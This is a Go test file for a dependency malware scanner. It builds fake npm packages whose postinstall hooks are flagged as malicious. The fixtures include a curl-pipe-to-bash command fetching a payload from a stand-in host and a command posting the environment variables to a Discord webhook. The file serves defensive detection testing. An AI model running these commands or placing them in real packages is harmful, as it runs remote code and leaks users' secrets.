package cmd

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/vulnetix/cli/v3/internal/ecosystems"
)

// fixtureRoot builds a malware test tree in a temp dir. It is created at runtime
// (not committed) because the repo .gitignore excludes **/node_modules/, which
// would otherwise drop the fixture from version control and break CI.
func fixtureRoot(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	write := func(rel, content string) {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatalf("mkdir %s: %v", p, err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatalf("write %s: %v", p, err)
		}
	}
	// A package whose postinstall pipes a remote script to a shell (P-CURL-PIPE).
	write("node_modules/evil-pkg/package.json", `{
  "name": "evil-pkg",
  "version": "1.0.0",
  "scripts": { "postinstall": "curl -s http://malware.example/payload.sh | bash" }
}`)
	write("node_modules/evil-pkg/index.js", "const http = require('http');\n")
	// A package whose postinstall exfiltrates env to a Discord webhook (IOC).
	write("node_modules/exfil-pkg/package.json", `{
  "name": "exfil-pkg",
  "version": "2.1.0",
  "scripts": { "postinstall": "node -e \"require('child_process').exec('env | curl -X POST -d @- https://discord.com/api/webhooks/123/abc')\"" }
}`)
	return root
}

func TestMalscanEngineDetectsManifestMalware(t *testing.T) {
	res, err := runMalscanEngine(malscanOptions{
		Root:           fixtureRoot(t),
		BinaryAnalysis: false,
		IOCFeeds:       false, // offline: detect + ioc + badhash only
	})
	if err != nil {
		t.Fatalf("runMalscanEngine: %v", err)
	}
	if !res.Malicious {
		t.Fatalf("expected malicious result, got clean (%d findings)", len(res.Findings))
	}

	// The curl-pipe-bash postinstall must be flagged as evidence with a located line.
	var curl *malscanFinding
	for i := range res.Findings {
		if res.Findings[i].RuleID == "P-CURL-PIPE" {
			curl = &res.Findings[i]
			break
		}
	}
	if curl == nil {
		t.Fatalf("expected P-CURL-PIPE finding; got %+v", ruleIDs(res.Findings))
	}
	if curl.Class != "evidence" || curl.Level != "error" {
		t.Fatalf("P-CURL-PIPE should be evidence/error, got %s/%s", curl.Class, curl.Level)
	}
	if curl.StartLine == 0 || curl.Snippet == "" {
		t.Fatalf("P-CURL-PIPE should carry a located line + snippet, got line=%d snippet=%q", curl.StartLine, curl.Snippet)
	}

	// The exfil endpoint must surface as an IOC with a stored sample.
	var exfil *malscanIOC
	for i := range res.IOCs {
		if res.IOCs[i].Type == "exfil-endpoint" {
			exfil = &res.IOCs[i]
			break
		}
	}
	if exfil == nil {
		t.Fatalf("expected an exfil-endpoint IOC; got %d IOCs", len(res.IOCs))
	}
	if exfil.Sample == nil || exfil.Sample.SHA256 == "" || len(exfil.Sample.Content) == 0 {
		t.Fatalf("exfil IOC must carry a sample with content + sha256, got %+v", exfil.Sample)
	}
}

func TestMalscanEngineReportsProgress(t *testing.T) {
	var stages []string
	res, err := runMalscanEngine(malscanOptions{
		Root:     fixtureRoot(t),
		IOCFeeds: false,
		Progress: func(stage string) {
			stages = append(stages, stage)
		},
	})
	if err != nil {
		t.Fatalf("runMalscanEngine: %v", err)
	}
	if res == nil || len(res.Targets) == 0 {
		t.Fatalf("expected scan targets")
	}
	for _, want := range []string{
		"Discovering dependency install targets",
		"Scanning target 1/1:",
		"Scanning manifests 1/1:",
	} {
		if !containsStage(stages, want) {
			t.Fatalf("expected progress stage containing %q, got %#v", want, stages)
		}
	}
}

func TestBuildMalscanSARIFShape(t *testing.T) {
	res, err := runMalscanEngine(malscanOptions{Root: fixtureRoot(t), IOCFeeds: false})
	if err != nil {
		t.Fatalf("runMalscanEngine: %v", err)
	}
	data, err := buildMalscanSARIFBytes(res, fixtureRoot(t), nil)
	if err != nil {
		t.Fatalf("buildMalscanSARIFBytes: %v", err)
	}
	var doc map[string]any
	if err := json.Unmarshal(data, &doc); err != nil {
		t.Fatalf("SARIF is not valid JSON: %v", err)
	}
	if doc["version"] != "2.1.0" {
		t.Fatalf("expected SARIF 2.1.0, got %v", doc["version"])
	}
	runs, _ := doc["runs"].([]any)
	if len(runs) == 0 {
		t.Fatalf("SARIF has no runs")
	}
	run := runs[0].(map[string]any)
	if results, _ := run["results"].([]any); len(results) == 0 {
		t.Fatalf("SARIF has no results")
	}
	props, _ := run["properties"].(map[string]any)
	if props["host"] == nil {
		t.Fatalf("SARIF run.properties.host missing (host env not embedded)")
	}
	if props["malicious"] != true {
		t.Fatalf("SARIF run.properties.malicious should be true")
	}
}

func ruleIDs(fs []malscanFinding) []string {
	out := make([]string, 0, len(fs))
	for _, f := range fs {
		out = append(out, f.RuleID)
	}
	return out
}

func containsStage(stages []string, want string) bool {
	for _, stage := range stages {
		if strings.Contains(stage, want) {
			return true
		}
	}
	return false
}

func TestPackageUnder(t *testing.T) {
	base := filepath.Join("/p", "node_modules")
	for _, c := range []struct{ path, slug, want string }{
		{"/p/node_modules/left-pad/index.js", "npm", "left-pad"},
		{"/p/node_modules/@scope/pkg/lib/a.js", "npm", "@scope/pkg"},
		{"/p/node_modules/a/node_modules/b/index.js", "npm", "b"},
		{"/p/node_modules/.pnpm/left-pad@1.3.0/node_modules/left-pad/x.js", "npm", "left-pad"},
		{"/p/node_modules", "npm", ""},
		{"/elsewhere/x.js", "npm", ""},
	} {
		if got := packageUnder(base, c.path, c.slug); got != c.want {
			t.Errorf("%s: got %q want %q", c.path, got, c.want)
		}
	}
	if got := packageUnder("/p/vendor", "/p/vendor/github.com/acme/lib/x.go", "go"); got != "github.com/acme/lib" {
		t.Errorf("go module: got %q", got)
	}
}

// The terminal report groups by package, so every finding has to say which
// package it came from, and the scan has to say how much it looked at.
func TestMalscanReportAttributesPackages(t *testing.T) {
	res, err := runMalscanEngine(malscanOptions{Root: fixtureRoot(t), IOCFeeds: false})
	if err != nil {
		t.Fatal(err)
	}
	pkgs := map[string]bool{}
	for _, f := range res.Findings {
		if f.Package == "" || f.Location != "node_modules" {
			t.Errorf("finding %s has no package/location: %q %q", f.RuleID, f.Package, f.Location)
		}
		pkgs[f.Package] = true
	}
	if !pkgs["evil-pkg"] || !pkgs["exfil-pkg"] {
		t.Errorf("expected both packages attributed, got %v", pkgs)
	}
	if len(res.Checked) == 0 || res.Checked[0].Packages != 2 {
		t.Errorf("expected 2 packages checked, got %+v", res.Checked)
	}
	if res.FeedsEnabled {
		t.Error("FeedsEnabled should mirror IOCFeeds")
	}

	m := malscanReportFrom(res)
	if len(m.Targets) != len(res.Checked) || len(m.Findings) != len(res.Findings) {
		t.Errorf("mapping lost rows: %+v", m)
	}
}

func TestSystemBinaryTargetsSkipClaimedDirs(t *testing.T) {
	sys := t.TempDir()
	for _, d := range []string{"usr/bin", "opt/agent"} {
		if err := os.MkdirAll(filepath.Join(sys, filepath.FromSlash(d)), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	claimed := []ecosystems.Target{{Path: filepath.Join(sys, "opt")}}
	got := systemBinaryTargets(sys, claimed)
	if len(got) != 1 {
		t.Fatalf("want only usr/bin, got %+v", got)
	}
	if got[0].Label != "/usr/bin" || got[0].EngineSlug != "generic" || !got[0].SystemScoped {
		t.Fatalf("unexpected target %+v", got[0])
	}
}
